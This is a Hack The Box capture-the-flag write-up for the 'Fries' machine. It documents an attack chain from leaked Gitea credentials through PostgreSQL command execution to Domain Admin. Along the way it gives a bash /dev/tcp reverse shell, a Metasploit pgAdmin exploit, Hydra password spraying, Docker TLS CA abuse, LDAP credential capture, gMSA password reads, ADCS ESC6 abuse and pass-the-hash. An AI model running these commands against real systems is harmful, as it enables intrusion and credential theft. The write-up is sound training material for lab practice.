<div align="center">

# Fries — HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows%20%2F%20Linux-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)

<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**

[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)

---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Target Information

| Property | Value |
|----------|-------|
| Machine | Fries |
| IP | `<TARGET_IP>` |
| OS | Windows / Linux |
| Difficulty | Hard |
| Hostname | fries.htb |

## Table of Contents

1. [Port Scanning](#port-scanning)
2. [Host Mapping](#host-mapping)
3. [Initial Creds (HTB Provided)](#initial-creds-htb-provided)
4. [Subdomain Discovery (FFUF)](#subdomain-discovery-ffuf)
5. [Gitea Recon - DB Creds](#gitea-recon---db-creds)
6. [PgAdmin Access - Postgres RCE](#pgadmin-access---postgres-rce)
7. [CVE-2025-2945 - Meterpreter](#cve-2025-2945---meterpreter)
8. [Password Reuse - SSH as svc](#password-reuse---ssh-as-svc)
9. [NFS Weak Export - Docker TLS Abuse](#nfs-weak-export---docker-tls-abuse)
10. [LDAP Credential Capture - svc_infra](#ldap-credential-capture---svc_infra)
11. [BloodHound - ReadMSAPassword - gMSA](#bloodhound---readmsapassword---gmsa)
12. [ADCS Abuse (ESC7 - ESC6/ESC16) - Domain Admin](#adcs-abuse-esc7---esc6esc16---domain-admin)
13. [Flags](#flags)

---

## Port Scanning

### Full Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <TARGET_IP>
```

### Service Scan

```bash
nmap -sCV -p<PORTS> <TARGET_IP>
```

<details>
<summary>Nmap Output (click to expand)</summary>

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-25 07:22 PST
Nmap scan report for <TARGET_IP>
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0.)
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
9389/tcp  open  mc-nmf        .NET Message Framing
...snip...
Service Info: Host: DC01; OSs: Linux, Windows
```

</details>

### Key Takeaways

- Windows AD services: Kerberos (88), LDAP (389/636), SMB (445), WinRM (5985)
- Linux web presence: nginx (80/443)
- Domain discovered: fries.htb
- Likely hybrid environment: Linux web host + Windows DC

---

## Host Mapping

```bash
sudo nano /etc/hosts
```

Add the following entry:

```text
<TARGET_IP>    fries.htb dc01.fries.htb
```

---

## Initial Creds (HTB Provided)

```text
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

These did not work for SSH or SMB initially -- they were likely intended for web apps.

---

## Subdomain Discovery (FFUF)

```bash
ffuf -c -w <WORDLIST> -u http://fries.htb -H "Host: FUZZ.fries.htb" -fw 4
```

<details>
<summary>FFUF Output (click to expand)</summary>

```text
code [Status: 200, Size: 13591, Words: 1048, Lines: 272, Duration: 47ms]
```

</details>

Update the hosts file:

```bash
sudo nano /etc/hosts
```

```text
<TARGET_IP>    fries.htb dc01.fries.htb code.fries.htb
```

Visiting `http://code.fries.htb` reveals Gitea.

HTB creds work here -- login successful.

---

## Gitea Recon - DB Creds

In commits, a `.env` file revealed PostgreSQL connection details:

```text
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

Another repo README referenced a database management subdomain.

Update the hosts file:

```text
<TARGET_IP>    fries.htb dc01.fries.htb code.fries.htb db-mgmt05.fries.htb
```

Visiting `db-mgmt05.fries.htb` shows PgAdmin login.

---

## PgAdmin Access - Postgres RCE

### Login with HTB creds

```text
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

When opening DB server, it asked for the DB root password:

```text
root password: PsqLR00tpaSS11
```

DB access confirmed.

---

### PostgreSQL File Read + Command Execution

```sql
SELECT pg_ls_dir('/');             -- directory listing works
SELECT pg_read_file('/etc/passwd'); -- file read works

CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'id';
SELECT * FROM cmd_test;
```

Output:

```text
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```

---

### Reverse Shell via COPY FROM PROGRAM

Start a listener on the attacker machine:

```bash
nc -lvnp <PORT>
```

Execute the payload via SQL:

```sql
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1"';
SELECT * FROM cmd_test;
```

Shell received:

```text
postgres@858fdf51af59:~/data$ whoami
postgres
```

---

### Shell Sanitization (TTY)

```bash
script /dev/null -c bash
```

Then:

```bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

stty size
stty rows <ROWS> columns <COLUMNS>
```

---

## CVE-2025-2945 - Authenticated RCE

A quick search pointed to CVE-2025-2945 in PgAdmin. Exploited using Metasploit:

```bash
msfconsole -q
use exploit/multi/http/pgadmin_query_tool_authenticated
```

Set options:

```text
set LHOST <YOUR_IP>
set LPORT <PORT>
set RHOSTS db-mgmt05.fries.htb
set VHOST db-mgmt05.fries.htb
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE11maan!!
set DB_USER root
set DB_PASS PsqLR00tpaSS11
set DB_NAME ps_db
```

Exploit results:

```text
Meterpreter session opened
meterpreter > getuid
Server username: pgadmin
```

---

## Password Reuse - SSH as svc

Environment variables revealed credentials:

```bash
env
```

Output contained:

```text
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
```

This password was used to brute-force SSH users.

### users.txt

```text
admin
d.cooper
cooper
dale
administrator
root
postgres
pgadmin
fries
svc_infra
svc
infra
```

Run Hydra against the target:

```bash
hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://<TARGET_IP> -t 64 -I
```

Valid hit:

```text
login: svc   password: Friesf00Ds2025!!
```

SSH access:

```bash
ssh svc@<TARGET_IP>
```

---

## NFS Weak Export - Docker TLS Abuse

### Export Check (Local)

```bash
showmount -e localhost
```

Output:

```text
/srv/web.fries.htb *
```

Directory permissions:

```bash
ls -la /srv/web.fries.htb
```

```text
drwxrwxrwx 2 root root     4096 Nov 26 16:14 shared
drwxrwx--- 2 root infra managers 4096 May 26 2025 certs
```

---

### Pivot into Internal Network (sshuttle)

On Kali:

```bash
sudo apt install sshuttle
sshuttle -r svc@<TARGET_IP> -N
```

---

### NFS Tooling

```bash
sudo apt update
sudo apt install pkg-config libfuse3-dev python3-dev
pipx install git+https://github.com/hvs-consulting/nfs-security-tooling.git
```

Analyze the NFS export:

```bash
/root/.local/bin/nfs_analyze 192.168.100.2 --check-no-root-squash
```

Mount the export with fake UID to bypass permissions:

```bash
mkdir /tmp/nfs_mount
/root/.local/bin/fuse_nfs --export /srv/web.fries.htb --fake-uid --allow-write /tmp/nfs_mount 192.168.100.2
ls -la /tmp/nfs_mount
```

---

### Docker TLS Tunnel

Tunnel docker port through SSH:

```bash
ssh svc@<TARGET_IP> -L 2376:127.0.0.1:2376
```

Attempt docker listing:

```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=cert.pem \
  --tlskey=key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

Authorization failed due to wrong cert identity -- generate a root cert using the CA.

### Generate Root Cert

```bash
openssl genrsa -out root-key.pem 4096
openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
openssl x509 -req -in root.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out root-cert.pem -days 365
```

Now list containers with the newly generated root cert:

```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

Containers visible.

---

## LDAP Credential Capture - svc_infra

Entered the `pwm` container (LDAP-connected):

```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 exec -it f42 /bin/bash
```

Found LDAP URL in the PWM configuration:

```bash
cat /config/PwmConfiguration.xml | grep "ldap"
```

Modified it to point to attacker machine:

```bash
sed -i 's|ldaps://dc01.fries.htb:636|ldap://<YOUR_IP>:389|' PwmConfiguration.xml
```

On attacker, run responder to capture credentials:

```bash
responder -I tun0 -wdv
```

Captured creds:

```text
CN=svc_infra,CN=Users,DC=fries,DC=htb
Password: m6tneOMAh5p0wQ0d
```

Validate the credentials:

```bash
netexec ldap <TARGET_IP> -u svc_infra -p 'm6tneOMAh5p0wQ0d'
```

Valid.

---

## BloodHound - ReadMSAPassword - gMSA

Collect BloodHound data:

```bash
bloodhound-ce-python -d 'fries.htb' -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d' -ns '<TARGET_IP>' -c All --zip
```

BloodHound showed `svc_infra` has ReadMSAPassword over `GMSA_CA_PROD$`.

Extract managed password:

```bash
bloodyAD --host <TARGET_IP> -d fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
```

Output:

```text
msDS-ManagedPassword.NT: fc20b3d3ec179c5339ca59fbefc18f4a
```

WinRM pass-the-hash:

```bash
evil-winrm -i <TARGET_IP> -u 'gMSA_CA_prod$' -H fc20b3d3ec179c5339ca59fbefc18f4a
```

Access gained.

---

## ADCS Abuse (ESC7 - ESC6/ESC16) - Domain Admin

Find vulnerable certificate templates:

```bash
certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <TARGET_IP> -vulnerable
```

Detected:

- ESC7 -- dangerous permissions
- ESC6 -- enrollee can specify SAN
- ESC16 -- security extension disabled

---

### ESC6 Exploitation: Request Admin Certificate

```bash
certipy-ad req -u "svc_infra" -p "m6tneOMAh5p0wQ0d" -dc-ip "<TARGET_IP>" \
-ca 'fries-DC01-CA' -template 'User' \
-upn 'administrator@fries.htb' \
-sid 'S-1-5-21-858338346-3861030516-3975240472-500'
```

Authenticate and dump hash:

```bash
ntpdate fries.htb
certipy-ad auth -pfx "administrator.pfx" -dc-ip '<TARGET_IP>' -username 'Administrator' -domain 'fries.htb'
```

Got hash:

```text
aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
```

WinRM pass-the-hash as Administrator:

```bash
evil-winrm -i <TARGET_IP> -u 'Administrator' -H a773cb05d79273299a684a23ede56748
```

Domain Admin access achieved.

---

## Attack Chain Summary

```text
FFUF subdomain -> Gitea creds leak -> PgAdmin access -> Postgres RCE -> CVE RCE -> env password reuse
-> SSH svc -> NFS weak export -> Docker TLS CA abuse -> LDAP redirect -> svc_infra creds
-> BloodHound ReadMSAPassword -> gMSA WinRM -> ADCS ESC chain -> Administrator hash -> Domain Admin
```

---

## Flags

| Flag | Value |
|------|-------|
| User | `<REDACTED>` |
| Root | `<REDACTED>` |

---

<div align="center">

**Written by MrsNobody**

<img src="../assets/MrsNobody.png" width="80">

*Hack The Box — Fries*

</div>
